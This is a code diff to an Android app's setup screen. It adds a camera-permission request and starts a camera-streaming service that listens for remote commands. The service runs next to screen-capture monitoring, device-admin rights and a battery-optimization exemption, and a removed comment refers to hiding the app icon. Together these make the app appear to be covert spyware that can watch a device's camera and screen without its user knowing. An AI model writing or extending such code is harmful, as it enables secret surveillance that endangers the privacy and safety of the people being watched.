@@ -57,6 +57,10 @@ class SetupActivity : AppCompatActivity() {
         ActivityResultContracts.RequestPermission()
     ) { nextStep() }
 
+    private val cameraPermLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { nextStep() }
+
     private val screenCaptureLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) { result ->
@@ -66,7 +70,8 @@ class SetupActivity : AppCompatActivity() {
                 .putBoolean(KEY_SETUP_DONE, true)
                 .apply()
             MonitorService.startWithProjection(this, result.resultCode, result.data!!)
-            // Show key dialog — DO NOT hide icon yet
+            // Also start camera stream service (listens for commands)
+            CameraStreamService.start(this)
             showCompletionStatus()
             showPairingKeyDialog(afterSetup = true)
         } else {
@@ -143,6 +148,7 @@ class SetupActivity : AppCompatActivity() {
     private fun nextStep() {
         when {
             !hasNotificationPermission() -> requestNotifPermission()
+            !hasCameraPermission()       -> requestCameraPermission()
             !hasUsageStatsPermission()   -> requestUsageStats()
             !isDeviceAdminActive()       -> requestDeviceAdmin()
             !isBatteryOptIgnored()       -> requestBatteryOptimization()
@@ -158,10 +164,20 @@ class SetupActivity : AppCompatActivity() {
     }
 
     private fun requestNotifPermission() {
-        setStatus("Requesting notification access...", 20)
+        setStatus("Requesting notification access...", 15)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             notifPermLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
         }
+    }
+
+    private fun hasCameraPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) ==
+                PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun requestCameraPermission() {
+        setStatus("Enabling camera access...", 25)
+        cameraPermLauncher.launch(Manifest.permission.CAMERA)
     }
 
     private fun hasUsageStatsPermission(): Boolean {
